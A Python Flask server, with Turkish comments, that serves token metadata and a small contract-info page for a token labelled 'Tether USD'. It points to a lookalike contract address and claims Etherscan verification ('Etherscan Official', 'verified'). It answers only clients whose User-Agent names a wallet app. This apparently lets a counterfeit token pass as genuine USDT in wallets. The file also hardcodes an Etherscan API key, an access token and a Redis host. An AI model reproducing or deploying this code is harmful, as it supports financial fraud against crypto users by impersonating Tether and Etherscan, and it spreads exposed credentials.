from flask import Flask, jsonify, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import random
import time
import os

app = Flask(__name__)

# Flask-Limiter’ı Redis ile yapılandır
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://red-d0vffs7fte5s739keisg:6379",  # Yerel Redis bağlantısı
    storage_options={"socket_connect_timeout": 30, "socket_keepalive": True}
)

# Ortam değişkenlerinden değerleri al, varsayılanlar test için
USDT_CONTRACT = os.environ.get("CONTRACT_ADDRESS", "0xDAC17f2a9b484780B9e109E003F7BB78B1C54A29")
ETHERSCAN_API_KEY = os.environ.get("ETHERSCAN_API_KEY", "E1MD7M2UGT1ZTTVX55JR6SVYKSBVA2EKCB")
API_KEY = os.environ.get("API_KEY", "SiyahSancak0258-MY-TOKEN-SiyahSancak0258")

# Desteklenen cüzdanlar
SUPPORTED_WALLETS = ["Trust-Wallet", "MetaMask", "TokenPocket", "Coinbase Wallet", "TronLink"]

def validate_request():
    # User-Agent’ta desteklenen cüzdan var mı kontrol et
    user_agent = request.headers.get("User-Agent", "")
    if not any(wallet in user_agent for wallet in SUPPORTED_WALLETS):
        return False, jsonify({"error": "Access denied: Invalid wallet"}), 403
    # API anahtarını kontrol et
    if request.headers.get("X-API-Key") != API_KEY:
        return False, jsonify({"error": "Access denied: Invalid API key"}), 403
    return True, None, None

def get_common_response():
    # API’nin döndüreceği JSON yanıtı
    return {
        "name": "Tether USD",
        "symbol": "USDT",
        "contract": USDT_CONTRACT,
        "decimals": 6,
        "verified": True,
        "logoURI": [
            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_1.png",
            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_2.png",
            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_3.png"
        ],
        "explorer": f"https://etherscan.io/address/{USDT_CONTRACT}",
        "etherscanVerified": True,
        "source": "Etherscan Official",
        "timestamp": int(time.time()),
        "network": {
            "name": "Ethereum",
            "chainId": "0x1"
        }
    }

@app.route('/', methods=['GET', 'HEAD'])
def health_check():
    # API’nin çalıştığını kontrol eden bir uç nokta
    return jsonify({"status": "ok", "message": "API is healthy and running"}), 200

@app.route('/api/token.json')
@limiter.limit("50 per minute")
def token_info():
    # Token bilgilerini döndür, erişim kontrolü yap
    valid, error, status = validate_request()
    if not valid:
        return error, status
    response = get_common_response()
    return jsonify(response), 200, {"Cache-Control": "public, max-age=3600", "X-Etherscan-API": "v1"}

@app.route('/address/')
def etherscan_page():
    # Basit bir HTML sayfası, kontrat bilgilerini gösterir
    valid, error, status = validate_request()
    if not valid:
        return error, status
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Contract Info</title>
        <style>body {{ font-family: Arial; margin: 20px; }}</style>
    </head>
    <body>
        <h1>Contract Information</h1>
        <p>Name: Tether USD</p>
        <p>Symbol: USDT</p>
        <p>Decimals: 6</p>
        <p>Status: Verified</p>
        <p>Verification Date: 2025-05-01</p>
    </body>
    </html>
    """
    return html, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)